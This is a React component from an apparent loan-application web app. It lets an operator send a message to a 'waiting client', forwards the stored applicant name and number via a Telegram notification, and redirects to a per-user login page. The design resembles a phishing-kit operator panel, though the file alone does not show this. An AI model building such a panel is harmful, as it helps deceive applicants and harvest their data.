import React, { useState, useEffect, useRef } from 'react'
import { useNavigate, useParams } from 'react-router-dom'
import { apiService } from '../services/api.js'

function MessageUser() {
  const navigate = useNavigate()
  const { user } = useParams()
  const userId = user || 'default'
  const [message, setMessage] = useState("")
  const [loading, setLoading] = useState(false)
  const [error, setError] = useState("")
  const inputRefs = useRef([])
  const timerRef = useRef(null)

  useEffect(() => {
    const urlParams = new URLSearchParams(window.location.search)
    const prefill = urlParams.get('prefill')
    if (prefill) {
      setMessage(decodeURIComponent(prefill))
    }
  }, [])

  const sendConfirmation = async () => {
    if (!message.trim()) return

    setLoading(true)
    setError("")

    try {
      const storedApp = localStorage.getItem('loanAppData')
      const appData = storedApp ? JSON.parse(storedApp) : {}
      
      await apiService.sendTelegramNotification({
        name: appData.name || "Client",
        number: appData.number || "",
        message: message
      })

      sessionStorage.setItem('adminMessage', message)
      alert("Message sent to user successfully")
      navigate(`/${userId}/login`)
    } catch (err) {
      setError("Failed to send message")
      setLoading(false)
    }
  }

  return (
    <div className="message-user-container">
      <div className="message-header">
        <h2>💬 Message User</h2>
        <p>Enter a message to send to the waiting client</p>
      </div>

      <div className="message-input-area">
        <textarea
          ref={el => inputRefs.current[0] = el}
          value={message}
          onChange={(e) => setMessage(e.target.value)}
          placeholder="Type your message here... (Can be in any language)"
          className="message-textarea"
          rows={6}
        />
      </div>

      {error && <div className="error-message">{error}</div>}

      <div className="message-actions">
        <button 
          onClick={sendConfirmation} 
          className="send-btn"
          disabled={loading || !message.trim()}
        >
          {loading ? "Sending..." : "Send Message"}
        </button>
        <button 
          onClick={() => navigate(`/${userId}/login`)}
          className="cancel-btn"
        >
          Cancel
        </button>
      </div>
    </div>
  )
}

export default MessageUser